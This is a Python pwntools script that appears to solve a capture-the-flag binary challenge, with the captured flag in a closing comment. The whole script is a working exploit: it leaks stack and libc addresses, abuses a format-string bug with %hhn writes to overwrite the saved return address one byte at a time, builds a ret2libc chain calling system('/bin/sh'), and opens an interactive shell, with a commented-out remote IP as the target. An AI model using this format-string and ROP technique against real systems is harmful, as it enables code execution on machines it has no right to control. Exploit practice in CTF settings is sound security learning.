from pwn import *
context.binary = "./challenge_patched"
script="""
b*vuln+120
b*main+158
"""
p = process()
#p = remote("34.70.212.151",8003)
#gdb.attach(p,script)
def choice(choose: bytes):
    p.sendlineafter(b'>>', choose)

def write_1_byte(addr: int, data: int):
    payload = b''
    if data==0:
        payload = f'%8$hhn'.encode().ljust(16,b'.')
    else:
        payload = f'%{data}c%8$hhn'.encode().ljust(16,b'.')
    payload += p64(addr)
    choice(b'2')
    time.sleep(0.2)
    p.recv()
    p.sendline(payload)

def write_8_bytes(addr: int, data: int):
    to_write = [
        data & 0xff,
        (data >> 8) & 0xff,
        (data >> 16) & 0xff,
        (data >> 24) & 0xff,
        (data >> 32) & 0xff,
        (data >> 40) & 0xff,
        (data >> 48) & 0xff,
        (data >> 56) & 0xff,
    ]
    for i in range(0,len(to_write)):
        write_1_byte(addr+i,to_write[i])


choice(b'1')
leak = p.recvline().strip(b'\n').split()
leak_stack = int(leak[0],16)
leak_fgets = int(leak[1],16)
leak_system = leak_fgets-0x2e610
libc_base = leak_fgets - 0x7f380
leak_rip = leak_stack+0x38
pop_rdi = libc_base + 0x000000000002a3e5
ret = pop_rdi + 1
bin_sh = libc_base +  0x1d8678
print(leak)
print(hex(leak_stack))
print(hex(leak_fgets))
log.info("Leak system: %s", hex(leak_system))

write_8_bytes(leak_rip,ret)
write_8_bytes(leak_rip+8,pop_rdi)
write_8_bytes(leak_rip+16,bin_sh)
write_8_bytes(leak_rip+24,leak_system)
gdb.attach(p,script)

choice(b'3')
p.interactive()

#Flag: flag{F0rm47_5tr1ng5_4r3_7o0_3asy}
